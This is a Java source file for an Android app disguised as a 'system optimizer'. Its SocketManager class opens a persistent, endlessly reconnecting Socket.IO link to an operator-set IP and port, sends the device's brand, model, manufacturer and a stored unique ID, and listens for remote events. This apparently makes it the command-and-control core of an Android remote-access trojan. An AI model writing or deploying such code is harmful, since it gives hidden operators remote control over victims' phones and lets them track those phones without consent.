package com.system.optimizer.network;

import io.socket.client.Socket;
import java.net.URISyntaxException;
import java.util.UUID;

import android.content.Context;

import com.system.optimizer.R;

import android.content.SharedPreferences;
import android.os.Build;
import android.util.Log;
import io.socket.client.IO;
import io.socket.client.IO.Options;
import io.socket.emitter.Emitter;

public class SocketManager {
    private static final String TAG = "SocketManager";

    private Socket socket;

    private final Options opts;

    public SocketManager(Context context) {
        
        opts = new Options();
        opts.reconnection = true;
        opts.reconnectionAttempts = Integer.MAX_VALUE;
        opts.reconnectionDelay = 5000;
        
        socket = connect(context);
    }

    public synchronized Socket connect(Context context) {
        if (socket != null) {
            return socket;
        }

        opts.query = "info=" + buildInfo(context);
        try {
            String ip = context.getString(R.string.MY_IP).trim();
            String port = context.getString(R.string.MY_PORT).trim();
            String url = "http://" + ip + ":" + port;
            socket = IO.socket(url, opts);
        } catch (URISyntaxException e) {
            Log.e(TAG, "Malformed url");
            socket = null;
            return null;
        }
        socket.connect();
        return socket;
    }

    public void addListener(String event, Emitter.Listener listener) {
        socket.on(event, listener);
    }

    public void sendEvent(String event, Object data) {
        if (socket != null) {
            socket.emit(event, data);
        }
    }

    public synchronized void disconnect() {
        if (socket != null) {
            socket.disconnect();
            socket = null;
        }
    }

    private String buildInfo(Context context) {
        StringBuilder info = new StringBuilder();
        info.append("{");
        info.append("\"Brand\":\"").append(Build.BRAND != null ? Build.BRAND : "Unknown")
                .append("\",");
        info.append("\"Model\":\"").append(Build.MODEL != null ? Build.MODEL : "Unknown").append("\",");
        info.append("\"Manufacturer\":\"").append(Build.MANUFACTURER != null ? Build.MANUFACTURER : "Unknown")
                .append("\",");
        info.append("\"device_uuid\":\"").append(getUUID(context)).append("\"");
        info.append("}");
        return info.toString();
    }

    private static String getUUID(Context context) {
        SharedPreferences prefs = context.getSharedPreferences("device_prefs", Context.MODE_PRIVATE);
        String uuid = prefs.getString("device_uuid", null);
        if (uuid == null) {
            uuid = UUID.randomUUID().toString();
            prefs.edit().putString("device_uuid", uuid).apply();
        }
        return uuid;
    }

}